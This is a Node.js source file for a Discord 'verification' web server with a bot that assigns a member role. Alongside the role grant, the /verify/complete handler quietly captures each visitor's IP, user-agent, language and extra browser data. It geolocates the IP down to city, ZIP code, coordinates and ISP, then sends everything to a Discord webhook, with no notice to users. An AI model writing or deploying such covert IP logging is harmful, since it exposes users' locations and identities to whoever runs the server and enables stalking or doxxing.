require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');

const PORT = process.env.PORT || process.env.VERIFY_PORT || 3000;
const SECRET = process.env.VERIFY_PAGE_SECRET || 'cambia-questo-secret';
const WEBHOOK = process.env.VERIFY_LOG_WEBHOOK || '';
const GUILD_ID = process.env.VERIFY_GUILD_ID || '';
const ROLE_ID = process.env.VERIFY_ROLE_ID || '';

const bot = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
if (process.env.TOKEN) bot.login(process.env.TOKEN).catch(e => console.error('[verify] login fallito:', e.message));

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return req.socket.remoteAddress;
}

async function giveMemberRole(discordUserId) {
  if (!GUILD_ID || !ROLE_ID || !discordUserId) return false;
  try {
    const guild = await bot.guilds.fetch(GUILD_ID);
    const member = await guild.members.fetch(discordUserId).catch(() => null);
    if (!member) return false;
    if (member.roles.cache.has(ROLE_ID)) return true;
    await member.roles.add(ROLE_ID);
    return true;
  } catch (e) { console.error('[verify] ruolo err:', e.message); return false; }
}

app.get('/verify/config', (req, res) => res.json({ secret: SECRET }));

app.post('/verify/complete', async (req, res) => {
  const { secret, discordUserId, discordTag, extra } = req.body || {};
  if (secret !== SECRET) return res.status(403).json({ ok: false });
  const ip = getIp(req);
  const ua = req.headers['user-agent'] || 'sconosciuto';
  const lang = req.headers['accept-language'] || 'sconosciuto';
  let geo = {};
  try {
    const r = await axios.get(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`, { timeout: 8000 });
    if (r.data && r.data.status === 'ok') geo = r.data;
  } catch (_) {}
  const roleGiven = await giveMemberRole(discordUserId);
  const embed = {
    title: '✅ Nuova verifica completata',
    color: 0x2ecc71,
    timestamp: new Date().toISOString(),
    fields: [
      { name: 'Utente', value: discordUserId ? `<@${discordUserId}> (${discordTag || discordUserId})` : (discordTag || 'sconosciuto'), inline: false },
      { name: 'ID', value: String(discordUserId || 'sconosciuto'), inline: true },
      { name: 'Ruolo membro', value: roleGiven ? 'assegnato ✅' : 'NON assegnato ❌', inline: true },
      { name: 'IP', value: String(ip), inline: false },
      { name: 'User-Agent', value: String(ua).slice(0, 1000), inline: false },
      { name: 'Lingua', value: String(lang).slice(0, 300), inline: true },
      { name: 'Paese', value: geo.country ? `${geo.country} (${geo.regionName || ''} ${geo.city || ''})` : 'sconosciuto', inline: true },
      { name: 'Citta / ZIP', value: geo.city ? `${geo.city} ${geo.zip || ''}` : 'sconosciuto', inline: true },
      { name: 'Coordinate', value: (geo.lat !== undefined) ? `${geo.lat}, ${geo.lon}` : 'sconosciuto', inline: true },
      { name: 'ISP / Org', value: geo.isp ? `${geo.isp} / ${geo.org || ''}`.slice(0, 500) : 'sconosciuto', inline: false },
      { name: 'Extra dal browser', value: extra ? JSON.stringify(extra).slice(0, 1500) : 'nessuno', inline: false }
    ]
  };
  if (WEBHOOK) await axios.post(WEBHOOK, { embeds: [embed] }).catch(e => console.error('[verify] webhook err:', e.message));
  return res.json({ ok: true, roleGiven });
});

app.listen(PORT, () => console.log('[verify] on :' + PORT));
